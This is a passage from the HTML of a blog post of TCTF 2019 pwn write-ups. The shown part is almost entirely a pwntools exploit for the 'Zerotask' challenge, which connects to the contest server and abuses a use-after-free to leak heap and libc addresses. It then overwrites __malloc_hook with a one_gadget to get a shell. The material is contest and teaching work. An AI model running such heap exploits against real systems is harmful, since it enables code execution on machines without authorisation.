class="string">"Encrypt(1) / Decrypt(2): "</span>,str(mode))</span><br><span class="line">   p.sendafter(<span class="string">"Key : "</span>,key)</span><br><span class="line">   p.sendafter(<span class="string">"IV : "</span>,IV)</span><br><span class="line">   p.sendlineafter(<span class="string">"Data Size : "</span>,str(dsize))</span><br><span class="line">   p.sendafter(<span class="string">"Data : "</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(ID,go=False)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> go:</span><br><span class="line">       p.sendlineafter(<span class="string">"Prepare...\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"2"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Task id : "</span>,str(ID))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(ID)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"3"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Task id : "</span>,str(ID))</span><br><span class="line"><span class="comment">#p=process("./zerotask")</span></span><br><span class="line">p=remote(<span class="string">"111.186.63.201"</span>,<span class="number">10001</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"0"</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"0"</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"0"</span>*<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">go(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="literal">True</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x70</span>,<span class="string">"0"</span>*<span class="number">0x60</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Ciphertext: \n"</span>)</span><br><span class="line">key1=<span class="string">"a"</span>*<span class="number">32</span></span><br><span class="line">key2=<span class="string">"a"</span>*<span class="number">16</span></span><br><span class="line">key3=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">     key3+=p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">key3=key3.split(<span class="string">" "</span>)</span><br><span class="line">message=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key3:</span><br><span class="line">    message+=chr(int(i,<span class="number">16</span>))</span><br><span class="line">k=decrypt(message)[<span class="number">-24</span>:<span class="number">-18</span>]</span><br><span class="line">heap_addr=u64(k.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">chunk=heap_addr+<span class="number">0x555555758ee0</span><span class="number">-0x555555758280</span></span><br><span class="line">ctx_addr=heap_addr<span class="number">-0x555555758280</span>+<span class="number">0x00005555557585a0</span></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">p.send(<span class="string">"0"</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x500</span>,<span class="string">"0"</span>*<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x500</span>,<span class="string">"0"</span>*<span class="number">0x500</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"1"</span>*<span class="number">0x50</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"0"</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"0"</span>*<span class="number">0x50</span>)</span><br><span class="line">go(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="literal">True</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">fake=p64(chunk)+p64(<span class="number">0x10</span>)+p64(<span class="number">0x6161616100000001</span>)+p64(<span class="number">0x6161616161616161</span>)*<span class="number">5</span>+p64(<span class="number">0x0000000061616161</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(ctx_addr)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x78</span>,fake)</span><br><span class="line">p.recvuntil(<span class="string">"Ciphertext: \n"</span>)</span><br><span class="line">key1=<span class="string">"a"</span>*<span class="number">32</span></span><br><span class="line">key2=<span class="string">"a"</span>*<span class="number">16</span></span><br><span class="line">key3=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">     key3+=p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">key3=key3.split(<span class="string">" "</span>)</span><br><span class="line">message=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key3:</span><br><span class="line">    message+=chr(int(i,<span class="number">16</span>))</span><br><span class="line">k=decrypt(message)</span><br><span class="line">libc_addr=u64(k[:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"></span><br><span class="line">fake_encode_addr=heap_addr<span class="number">-0x555555758280</span>+<span class="number">0x555555758520</span></span><br><span class="line">fake_addr=heap_addr<span class="number">-0x555555758280</span>+<span class="number">0x555555759430</span></span><br><span class="line">key1=<span class="string">"1"</span>*<span class="number">32</span></span><br><span class="line">key2=<span class="string">"1"</span>*<span class="number">16</span></span><br><span class="line">dest=<span class="string">"\x00"</span>*<span class="number">8</span>+p64(<span class="number">0x320</span>)</span><br><span class="line">src=<span class="string">"\x00"</span>*<span class="number">0xf00</span>+<span class="string">"\x00"</span>*<span class="number">8</span>+p64(<span class="number">0xf11</span>)+<span class="string">"\x00"</span>*<span class="number">0xf0</span></span><br><span class="line">magic=encrypt(src)[<span class="number">-16</span>:]</span><br><span class="line">magic2=decrypt2(dest)</span><br><span class="line">s1=xor(magic,magic2)</span><br><span class="line">s2=xor(decrypt2(p64(fake_encode_addr)+p64(<span class="number">0x320</span>)),dest)</span><br><span class="line">s3=xor(decrypt2(p64(fake_encode_addr)+p64(<span class="number">0x320</span>)),p64(fake_encode_addr)+p64(<span class="number">0x320</span>))</span><br><span class="line">fake_code=<span class="string">"\x00"</span>*<span class="number">0xf00</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf11</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x200</span>,<span class="string">"\x00"</span>*<span class="number">0x200</span>,<span class="literal">True</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0xf00</span>,<span class="string">"\x00"</span>*<span class="number">0xf00</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0xf00</span>,<span class="string">"\x00"</span>*<span class="number">0xf0</span>+s1+s2+s3+<span class="string">"\x00"</span>*(<span class="number">0xf00</span><span class="number">-0x120</span>))</span><br><span class="line"></span><br><span class="line">ctx_addr=heap_addr<span class="number">-0x555555758280</span>+<span class="number">0x000055555575b2d0</span></span><br><span class="line">add(<span class="number">100</span>,<span class="number">1</span>,<span class="string">"1"</span>*<span class="number">32</span>,<span class="string">"1"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"0"</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"0"</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x50</span>,<span class="string">"0"</span>*<span class="number">0x50</span>)</span><br><span class="line">go(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="literal">True</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">fake=p64(fake_addr)+p64(<span class="number">0x1030</span>)+p64(<span class="number">0x6161616100000001</span>)+p64(<span class="number">0x6161616161616161</span>)*<span class="number">5</span>+p64(<span class="number">0x0000000061616161</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(ctx_addr)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">16</span>,<span class="number">0x78</span>,fake)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">malloc_hook=libc_addr<span class="number">-0x7ffff776dca0</span>+<span class="number">0x7ffff776dc30</span></span><br><span class="line">one_gadget=libc_addr<span class="number">-0x7ffff776dca0</span>+<span class="number">0x7ffff7382000</span>+<span class="number">0x10a38c</span></span><br><span class="line">add(<span class="number">200</span>,<span class="number">1</span>,<span class="string">"1"</span>*<span class="number">32</span>,<span class="string">"1"</span>*<span class="number">16</span>,<span class="number">0x318</span>,<span class="string">"\x00"</span>*<span class="number">0x2a0</span>+p64(malloc_hook)+<span class="string">"\x00"</span>*(<span class="number">0x318</span><span class="number">-0x2a8</span>))</span><br><span class="line">add(<span class="number">200</span>,<span class="number">1</span>,<span class="string">"1"</span>*<span class="number">32</span>,<span class="string">"1"</span>*<span class="number">16</span>,<span class="number">0x78</span>,p64(one_gadget)+<span class="string">"\x00"</span>*<span class="number">0x70</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#If-on-a-winters-night-a-traveler"><span class="toc-number">1.</span> <span class="toc-text">If on a winters night a traveler</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-Vim"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze Vim</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-Overflow"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-EXP"><span class="toc-number">1.3.</span> <span class="toc-text">Analyze EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyaegis"><span class="toc-number">2.</span> <span class="toc-text">babyaegis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-UAF-amp-amp-Overflow"><span class="toc-number">2.1.</span> <span class="toc-text">Analyze UAF&amp;&amp;Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-LLVM"><span class="toc-number">2.2.</span> <span class="toc-text">Analyze LLVM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">Analyze EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zerotask"><span class="toc-number">3.</span> <span class="toc-text">Zerotask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">3.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/25/TCTF-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&text=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&is_video=false&description=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=TCTF 2019 PWN&body=Check out this article: http://yoursite.com/2019/03/25/TCTF-2019-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&name=TCTF 2019 PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


